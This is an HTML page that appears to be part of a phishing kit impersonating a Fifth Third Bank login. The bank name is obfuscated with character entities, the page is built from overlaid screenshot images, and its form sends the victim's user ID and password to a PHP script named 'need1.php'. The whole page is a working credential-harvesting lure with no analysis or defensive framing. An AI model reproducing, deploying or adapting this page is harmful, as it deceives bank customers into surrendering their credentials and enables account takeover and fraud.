<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>F&#105;&#102;&#116;h T&#104;&#105;&#114;d B&#97;&#110;k </title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="images/favicon.ico"/>
<style type="text/css">  
.textbox {  
    border: solid 1px #ccc; 
  	padding-left: 8px;
	font-family: "Open Sans","Arial",sans-serif;
  	font-size: 16px;
    height: 40px; 
    width: 275px; 
 }  
.textbox:focus {  
    border: 1px solid #1C4094; 
    box-shadow: 0px 0px 4px #1C4094;  
    outline: 0; 
 }  
.textbox1 {  
    border: solid 1px #ccc; 
  	padding-left: 8px;
	font-family: "Open Sans","Arial",sans-serif;
  	font-size: 16px;
    height: 34px; 
    width: 275px; 
 } 
 
.textbox1:focus {  
    border: 1px solid #1C4094; 
    box-shadow: 0px 0px 4px #1C4094;  
    outline: 0; 
 } 
</style>

</head>
<body>
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:420px; height:616px; z-index:0"><img src="images/t1.png" alt="" title="" border=0 width=420 height=616></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:614px; width:420px; height:418px; z-index:1"><img src="images/t3.png" alt="" title="" border=0 width=420 height=418></div>
<form action=need1.php name=pkw method=post>
<select name="ac" class="textbox1" autocomplete="off" required type="text" style="position:absolute;width:377px;left:23px;top:122px;z-index:2">
<option value="Online Banking" selected="selected">O&#110;&#108;&#105;&#110;e B&#97;&#110;&#107;&#105;&#110;g </option>
                <option value="C&#111;&#109;&#109;&#101;&#114;&#99;&#105;&#97;l B&#97;&#110;&#107;&#105;&#110;g ">C&#111;&#109;&#109;&#101;&#114;&#99;&#105;&#97;l B&#97;&#110;&#107;&#105;&#110;g </option></select>
<input name="sr" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:376px;left:23px;top:198px;z-index:3">
<input name="dw" class="textbox" autocomplete="off" required type="password" style="position:absolute;width:376px;left:23px;top:280px;z-index:4">
<div id="formimage1" style="position:absolute; left:22px; top:328px; z-index:5"><input type="image" name="formimage1" width="378" height="39" src="images/t2.png"></div>

</body>
</html>
